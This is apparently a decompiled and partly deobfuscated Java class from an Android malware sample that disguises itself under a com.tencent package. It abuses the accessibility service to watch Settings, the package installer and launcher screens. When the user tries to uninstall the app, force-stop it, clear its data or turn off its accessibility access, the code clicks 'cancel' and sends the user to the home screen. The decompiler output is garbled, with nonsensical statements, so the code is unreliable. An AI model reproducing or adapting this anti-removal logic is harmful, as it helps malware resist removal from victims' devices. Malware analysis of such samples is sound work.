package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AppUninstallerEngine
 * Original: Lcom/tencent/Unin_tunesxconcerningn10_stall;
 */
public class AppUninstallerEngine {

    // === FIELDS ===
    static String appname = "";
    static String appname2 = "";
    private static AccessibilityServiceCore context;

    // === METHODS ===

    static void StaticInitializer() {
        return;
    }

    public void Constructor() {
        // new Object()
        return;
    }

    static AccessibilityServiceCore access$000() {
        v0 = AppUninstallerEngine.context;
        return v0;
    }

    public static void check(AccessibilityEvent param0) {
        v0 = "Accessibility";
        v1 = "on";
        v2 = MainBackgroundService.uninstall;
        "on".equals(v2);
        if ("on" != null && "on" != 0) { // goto +3
        return;
        if (v6 != null && v6 != 0) { // goto +3
        return;
        if ("on" != null && "on" != 0) { // goto +3
        return;
        if ("on" != null && "on" != 0) { // goto +3
        return;
        v6.getClassName();
        v2.toString();
        v2.toLowerCase();
        Log.i("22222222222", v2);
        v6.getClassName();
        v2 = "22222222222".toString();
        v2 = "22222222222".toLowerCase();
        v2 = "com.android.settings.SubSettings";
        "com.android.settings.SubSettings".toLowerCase();
        v6.getClassName();
        v3.toString();
        v3.toLowerCase();
        "com.android.settings.SubSettings".equals(v3);
        if ("com.android.settings.SubSettings" == null || "com.android.settings.SubSettings" == 0) { // goto +56
        v3 = "com.android.settings.SubSettings".getEventText(v6);
        v3 = "com.android.settings.SubSettings".toLowerCase();
        v3 = AppUninstallerEngine.appname;
        v3.toLowerCase();
        "com.android.settings.SubSettings".equals(v3);
        if ("com.android.settings.SubSettings" != null && "com.android.settings.SubSettings" != 0) { // goto +24
        v3 = "com.android.settings.SubSettings".getEventText(v6);
        v3 = "com.android.settings.SubSettings".toLowerCase();
        v3 = AppUninstallerEngine.appname2;
        v3.toLowerCase();
        "com.android.settings.SubSettings".equals(v3);
        if ("com.android.settings.SubSettings" == null || "com.android.settings.SubSettings" == 0) { // goto +12
        "com.android.settings.SubSettings".tunesxconcerningn1012blockBack();
        "com.android.settings.SubSettings".tunesxconcerningn1012SendMeHome();
        "com.android.settings.SubSettings".getEventText(v6);
        "com.android.settings.SubSettings".toLowerCase();
        v6.getPackageName();
        v3.toString();
        v3.toLowerCase();
        "Accessibility".toLowerCase();
        v4 = "com.android.settings.SubSettings".contains(v4);
        if (v4 == null || v4 == 0) { // goto +20
        v4 = AppUninstallerEngine.appname2;
        v4 = "com.android.settings.SubSettings".contains(v4);
        if (v4 == null || v4 == 0) { // goto +12
        v4 = AppUninstallerEngine.context;
        v4.tunesxconcerningn1012blockBack();
        v4 = AppUninstallerEngine.context;
        v4.tunesxconcerningn1012SendMeHome();
        "Accessibility".toLowerCase();
        v3.contains("Accessibility");
        if ("Accessibility" == null || "Accessibility" == 0) { // goto +20
        "com.android.settings.SubSettings".contains("Accessibility");
        if ("Accessibility" == null || "Accessibility" == 0) { // goto +12
        "Accessibility".tunesxconcerningn1012blockBack();
        "Accessibility".tunesxconcerningn1012SendMeHome();
        "Accessibility".getPackageName();
        v4 = AccessibilityServiceCore.tunesxconcerningn1012getAppNameFromPkgName("Accessibility", v4);
        v4 = "Accessibility".toLowerCase();
        v4 = LanguageManager.installStr1;
        v5 = v4.toLowerCase();
        v5 = "com.android.settings.SubSettings".contains(v4);
        v5 = "cancel";
        if (v4 != null && v4 != 0) { // goto +24
        v4 = LanguageManager.installStr1;
        v4.toLowerCase();
        "com.android.settings.SubSettings".contains(v4);
        if (v4 == null || v4 == 0) { // goto +25
        "Accessibility".toLowerCase();
        "com.android.settings.SubSettings".contains("Accessibility");
        if ("Accessibility" == null || "Accessibility" == 0) { // goto +15
        AccessibilityServiceCore.tunesxconcerningn1012clickByText("cancel");
        "Accessibility".tunesxconcerningn1012blockBack();
        "Accessibility".tunesxconcerningn1012SendMeHome();
        "Accessibility".toLowerCase();
        "com.android.settings.SubSettings".contains("Accessibility");
        if ("Accessibility" != null && "Accessibility" != 0) { // goto +26
        "Accessibility".toLowerCase();
        "com.android.settings.SubSettings".contains("Accessibility");
        if ("Accessibility" == null || "Accessibility" == 0) { // goto +27
        "Accessibility".toLowerCase();
        "com.android.settings.SubSettings".contains("Accessibility");
        if ("Accessibility" == null || "Accessibility" == 0) { // goto +15
        AccessibilityServiceCore.tunesxconcerningn1012clickByText("cancel");
        "Accessibility".tunesxconcerningn1012blockBack();
        "Accessibility".tunesxconcerningn1012SendMeHome();
        "强制停止".toLowerCase();
        "com.android.settings.SubSettings".contains("强制停止");
        if ("强制停止" != null && "强制停止" != 0) { // goto +38
        "强行停止".toLowerCase();
        "com.android.settings.SubSettings".contains("强行停止");
        if ("强行停止" != null && "强行停止" != 0) { // goto +26
        "结束运行".toLowerCase();
        "com.android.settings.SubSettings".contains("结束运行");
        if ("结束运行" != null && "结束运行" != 0) { // goto +14
        "Force stop".toLowerCase();
        "com.android.settings.SubSettings".contains("Force stop");
        if ("Force stop" == null || "Force stop" == 0) { // goto +15
        AccessibilityServiceCore.tunesxconcerningn1012clickByText("cancel");
        "Force stop".tunesxconcerningn1012blockBack();
        "Force stop".tunesxconcerningn1012SendMeHome();
        "删除数据".toLowerCase();
        "com.android.settings.SubSettings".contains("删除数据");
        if ("删除数据" != null && "删除数据" != 0) { // goto +38
        "清除数据".toLowerCase();
        "com.android.settings.SubSettings".contains("清除数据");
        if ("清除数据" != null && "清除数据" != 0) { // goto +26
        "清除存储空间".toLowerCase();
        "com.android.settings.SubSettings".contains("清除存储空间");
        if ("清除存储空间" != null && "清除存储空间" != 0) { // goto +14
        "Delete app data".toLowerCase();
        "com.android.settings.SubSettings".contains("Delete app data");
        if ("Delete app data" == null || "Delete app data" == 0) { // goto +15
        AccessibilityServiceCore.tunesxconcerningn1012clickByText("cancel");
        "Delete app data".tunesxconcerningn1012blockBack();
        "Delete app data".tunesxconcerningn1012SendMeHome();
        AccessibilityServiceCore.getApplicationName("Delete app data");
        "com.android.settings.SubSettings".contains("Delete app data");
        if ("Delete app data" == null || "Delete app data" == 0) { // goto +7
        "com.android.settings.SubSettings".contains("Delete app data");
        "Phone options".toLowerCase();
        "com.android.settings.SubSettings".contains("Phone options");
        if ("Phone options" == null || "Phone options" == 0) { // goto +12
        "Phone options".tunesxconcerningn1012blockBack();
        "Phone options".tunesxconcerningn1012SendMeHome();
        "إيقاف".toLowerCase();
        "com.android.settings.SubSettings".contains("إيقاف");
        if ("إيقاف" == null || "إيقاف" == 0) { // goto +10
        "com.android.settings.SubSettings".contains("إيقاف");
        if ("إيقاف" != null && "إيقاف" != 0) { // goto +22
        "stop".toLowerCase();
        "com.android.settings.SubSettings".contains("stop");
        if ("stop" == null || "stop" == 0) { // goto +23
        "com.android.settings.SubSettings".contains("stop");
        if ("stop" == null || "stop" == 0) { // goto +15
        AccessibilityServiceCore.tunesxconcerningn1012clickByText("cancel");
        "stop".tunesxconcerningn1012blockBack();
        "stop".tunesxconcerningn1012SendMeHome();
        v4 = v6.getPackageName();
        v4 = "stop".toString();
        v4 = "com.google.android.packageinstaller";
        "stop".contains("com.google.android.packageinstaller");
        if ("stop" == null || "stop" == 0) { // goto +57
        v6.getClassName();
        "stop".toString();
        "stop".toLowerCase();
        "stop".contains("android.app.alertdialog");
        if ("stop" == null || "stop" == 0) { // goto +37
        "stop".getEventText(v6);
        "stop".toLowerCase();
        "android.app.alertdialog".toLowerCase();
        "stop".contains("android.app.alertdialog");
        if ("stop" == null || "stop" == 0) { // goto +15
        AccessibilityServiceCore.tunesxconcerningn1012clickByText("cancel");
        "stop".tunesxconcerningn1012blockBack();
        "stop".tunesxconcerningn1012SendMeHome();
        "22222222222".equals("android.support.v7.widget.recyclerview");
        if ("android.support.v7.widget.recyclerview" != null && "android.support.v7.widget.recyclerview" != 0) { // goto +26
        "22222222222".equals("android.widget.tablelayout");
        if ("android.widget.tablelayout" != null && "android.widget.tablelayout" != 0) { // goto +18
        "22222222222".equals("android.widget.linearlayout");
        if ("android.widget.linearlayout" != null && "android.widget.linearlayout" != 0) { // goto +10
        "22222222222".equals("android.widget.framelayout");
        if ("android.widget.framelayout" == null || "android.widget.framelayout" == 0) { // goto +78
        v6.getPackageName();
        "android.widget.framelayout".toString();
        "android.widget.framelayout".equals("com.android.settings");
        if ("android.widget.framelayout" != null && "android.widget.framelayout" != 0) { // goto +18
        v6.getPackageName();
        "android.widget.framelayout".toString();
        "android.widget.framelayout".equals("com.miui.securitycenter");
        if ("android.widget.framelayout" == null || "android.widget.framelayout" == 0) { // goto +48
        "android.widget.framelayout".getEventText(v6);
        "android.widget.framelayout".toLowerCase();
        "android.widget.framelayout".contains("com.miui.securitycenter");
        if ("android.widget.framelayout" != null && "android.widget.framelayout" != 0) { // goto +20
        "android.widget.framelayout".getEventText(v6);
        "android.widget.framelayout".toLowerCase();
        "android.widget.framelayout".contains("com.miui.securitycenter");
        if ("android.widget.framelayout" == null || "android.widget.framelayout" == 0) { // goto +12
        "android.widget.framelayout".tunesxconcerningn1012blockBack();
        "android.widget.framelayout".tunesxconcerningn1012SendMeHome();
        Br_tunesxconcerningn10_and.getBrand();
        "android.widget.framelayout".toLowerCase();
        "android.widget.framelayout".equals("oppo");
        if ("android.widget.framelayout" == null || "android.widget.framelayout" == 0) { // goto +37
        v6.getPackageName();
        "android.widget.framelayout".toString();
        "android.widget.framelayout".equals("com.android.settings");
        if ("android.widget.framelayout" == null || "android.widget.framelayout" == 0) { // goto +23
        "com.android.settings.SubSettings".equals("android.widget.framelayout");
        if ("android.widget.framelayout" == null || "android.widget.framelayout" == 0) { // goto +15
        // new AppUninstallerEngine$1()
        // new Thread("oppo")
        "android.widget.framelayout".start();
        "com.sec.android.app.launcher".equals(v3);
        if ("com.sec.android.app.launcher" != null && "com.sec.android.app.launcher" != 0) { // goto +10
        "com.android.launcher".equals(v3);
        if ("com.android.launcher" == null || "com.android.launcher" == 0) { // goto +10
        "com.android.settings.SubSettings".equals("com.android.launcher");
        if ("com.android.launcher" != null && "com.android.launcher" != 0) { // goto +22
        "com.miui.home".equals(v3);
        if ("com.miui.home" == null || "com.miui.home" == 0) { // goto +27
        v6.getContentDescription();
        v6 = "com.miui.home".equals(v6);
        if (v6 == null || v6 == 0) { // goto +15
        v6 = new Thread();
        // new AppUninstallerEngine$2()
        // new Thread("com.miui.home")
        v6.start();
        return;
    }

    public static void start(AccessibilityServiceCore param0) {
        AppUninstallerEngine.context = v2;
        v2 = new StringBuilder();
        v0 = "[";
        // new StringBuilder("[")
        "[".getPackageName();
        AccessibilityServiceCore.tunesxconcerningn1012getAppNameFromPkgName("[", v1);
        "[".toLowerCase();
        v2.append("[");
        v2.append("]");
        v2 = v2.toString();
        AppUninstallerEngine.appname = v2;
        v2 = AppUninstallerEngine.context;
        v2.getPackageName();
        v2 = AccessibilityServiceCore.tunesxconcerningn1012getAppNameFromPkgName(v2, "]");
        v2 = v2.toLowerCase();
        AppUninstallerEngine.appname2 = v2;
        return;
    }
}
